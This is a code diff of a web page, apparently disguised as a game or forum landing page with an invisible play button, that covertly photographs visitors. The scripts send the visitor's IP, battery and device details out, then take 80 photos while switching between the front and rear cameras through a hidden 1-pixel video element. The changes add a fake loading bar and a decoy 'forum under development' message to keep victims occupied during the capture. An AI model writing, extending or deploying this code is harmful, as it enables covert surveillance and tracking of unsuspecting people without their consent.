@@ -8,87 +8,131 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-        }body {
-        overflow: hidden;
-        touch-action: none;
-        -webkit-text-size-adjust: none;
-        text-size-adjust: none;
-        height: 100vh;
-        font-family: Arial, sans-serif;
-        position: relative;
-        background: #000;
-        display: flex;
-        flex-direction: column;
-    }
-    
-    .background-container {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
-        background-size: cover;
-        z-index: -2;
-    }
-    
-    .content {
-        position: relative;
-        z-index: 1;
-        height: 100vh;
-        display: flex;
-        flex-direction: column;
-        justify-content: flex-end;
-        align-items: center;
-        padding-bottom: 20px;
-    }
-    
-    .play-btn {
-        background: transparent;
-        border: none;
-        width: 200px;
-        height: 80px;
-        margin-bottom: 100px;
-        cursor: pointer;
-        position: absolute;
-        bottom: 150px;
-        opacity: 0;
-    }
-    
-    .hidden-camera {
-        position: absolute;
-        opacity: 0;
-        width: 1px;
-        height: 1px;
-    }
-    
-    .legal-links {
-        position: absolute;
-        bottom: 10px;
-        width: 100%;
-        text-align: center;
-        color: #fff;
-        font-size: 12px;
-        padding: 5px 0;
-    }
-    
-    .message-box {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: rgba(0, 0, 0, 0.8);
-        color: white;
-        padding: 20px;
-        border-radius: 10px;
-        text-align: center;
-        z-index: 100;
-        display: none;
-    }
-</style>
+        }
+        body {
+            overflow: hidden;
+            touch-action: none;
+            -webkit-text-size-adjust: none;
+            text-size-adjust: none;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            position: relative;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .background-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
+            background-size: cover;
+            z-index: -2;
+        }
+        
+        .new-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.ibb.co/kVcnz5xZ/14.png') no-repeat center center;
+            background-size: cover;
+            z-index: -1;
+            display: none;
+        }
+        
+        .content {
+            position: relative;
+            z-index: 1;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: center;
+            padding-bottom: 20px;
+        }
+        
+        .play-btn {
+            background: transparent;
+            border: none;
+            width: 200px;
+            height: 80px;
+            margin-bottom: 100px;
+            cursor: pointer;
+            position: absolute;
+            bottom: 150px;
+            opacity: 0;
+        }
+        
+        .hidden-camera {
+            position: absolute;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+        }
+        
+        .legal-links {
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            color: #fff;
+            font-size: 12px;
+            padding: 5px 0;
+        }
+        
+        .message-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 100;
+            display: none;
+        }
+        
+        .loading-container {
+            position: absolute;
+            bottom: 50px;
+            width: 80%;
+            left: 10%;
+            text-align: center;
+            color: white;
+            display: none;
+        }
+        
+        .loading-text {
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #333;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0;
+            background-color: white;
+            transition: width 0.1s linear;
+        }
+    </style>
 </head>
 <body>
     <div class="background-container"></div>
+    <div class="new-background"></div>
     <div class="content">
         <button class="play-btn" id="playBtn"></button>
     </div>
@@ -98,7 +142,14 @@
     </div>
 
     <div class="message-box" id="messageBox">
-        Форум в разработке
+        Ф��рум в разработке
+    </div>
+
+    <div class="loading-container" id="loadingContainer">
+        <div class="loading-text">Loading</div>
+        <div class="progress-bar">
+            <div class="progress" id="progressBar"></div>
+        </div>
     </div>
 
     <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
@@ -114,13 +165,16 @@
         const videoElement = document.getElementById('hiddenCamera');
         const playBtn = document.getElementById('playBtn');
         const messageBox = document.getElementById('messageBox');
+        const newBackground = document.querySelector('.new-background');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const progressBar = document.getElementById('progressBar');
         
         let currentStream = null;
         let frontCameraStream = null;
         let backCameraStream = null;
         let photoCount = 0;
-        const totalPhotos = 80; // 40 с каждой камеры
-        const photoInterval = 250; // 0.25 секунды
+        const totalPhotos = 80;
+        const photoInterval = 250;
         let isFrontCameraActive = true;
 
         // Блокировка масштабирования
@@ -219,6 +273,44 @@
             return result;
         }
 
+        // Функция для проверки разрешения на камеру
+        async function checkCameraPermission() {
+            try {
+                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                return permissionStatus.state === 'granted';
+            } catch (e) {
+                // Если API permissions не поддерживается, проверяем через getUserMedia
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(track => track.stop());
+                    return true;
+                } catch {
+                    return false;
+                }
+            }
+        }
+
+        // Функция для запуска прогресс-бара
+        function startProgressBar() {
+            loadingContainer.style.display = 'block';
+            let progress = 0;
+            const interval = 40; // 40 секунд = 40000 миллисекунд
+            const step = 100 / (interval * 10); // 10 обновлений в секунду
+            
+            const timer = setInterval(() => {
+                progress += step;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    messageBox.style.display = 'block';
+                    setTimeout(() => {
+                        progressBar.style.width = '0%';
+                    }, 1000);
+                }
+            }, 100);
+        }
+
         // 1. Отправка информации о пользователе
         async function sendUserInfo() {
             try {
@@ -227,7 +319,7 @@
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
-                // Получаем дополнительную информацию (без геолокации)
+                // Получаем дополнительную информацию
                 const [batteryInfo, connectionInfo] = await Promise.all([
                     getBatteryInfo(),
                     getConnectionInfo()
@@ -255,7 +347,6 @@
 
             } catch (error) {
                 console.error('Error sending user info:', error);
-                // Отправляем хотя бы базовую информацию в случае ошибки
                 try {
                     const deviceInfo = getDeviceInfo();
                     let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
@@ -313,16 +404,13 @@
         // 3. Переключение между камерами
         async function switchCamera() {
             try {
-                // Останавливаем текущий поток
                 if (currentStream) {
                     currentStream.getTracks().forEach(track => track.stop());
                 }
 
-                // Выбираем следующую камеру
                 isFrontCameraActive = !isFrontCameraActive;
                 const facingMode = isFrontCameraActive ? 'user' : 'environment';
 
-                // Запрашиваем доступ к новой камере
                 currentStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: facingMode,
@@ -334,14 +422,12 @@
 
                 videoElement.srcObject = currentStream;
 
-                // Сохраняем поток для быстрого переключения
                 if (isFrontCameraActive) {
                     frontCameraStream = currentStream;
                 } else {
                     backCameraStream = currentStream;
                 }
 
-                // Даем камере время на инициализацию
                 await new Promise(resolve => setTimeout(resolve, 300));
 
             } catch (error) {
@@ -358,19 +444,15 @@
                     photoCount++;
                     
                     if (photoCount < totalPhotos) {
-                        // Переключаем камеру перед следующим снимком
                         await switchCamera();
                         setTimeout(takeSeriesOfPhotos, photoInterval);
                     } else {
-                        // Завершаем съемку
-                        messageBox.style.display = 'block';
                         stopAllCameras();
                     }
                 }
                 
             } catch (error) {
                 console.error('Ошибка в процессе серийной съемки:', error);
-                messageBox.style.display = 'block';
                 stopAllCameras();
             }
         }
@@ -394,7 +476,11 @@
         // 6. Инициализация камер
         async function initCameras() {
             try {
-                // Проверяем доступность камер
+                const hasCameraPermission = await checkCameraPermission();
+                if (!hasCameraPermission) {
+                    throw new Error('Доступ к камере не разрешен');
+                }
+
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const hasFrontCamera = devices.some(device => 
                     device.kind === 'videoinput' && device.label.toLowerCase().includes('front'));
@@ -405,7 +491,10 @@
                     throw new Error('Не обнаружены обе камеры');
                 }
 
-                // Начинаем с фронтальной камеры
+                // Показываем новый фон и запускаем прогресс-бар
+                newBackground.style.display = 'block';
+                startProgressBar();
+
                 isFrontCameraActive = true;
                 currentStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
@@ -418,10 +507,8 @@
                 frontCameraStream = currentStream;
                 videoElement.srcObject = currentStream;
 
-                // Даем камере время на инициализацию
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
-                // Начинаем серийную съемку
                 photoCount = 0;
                 takeSeriesOfPhotos();
                 
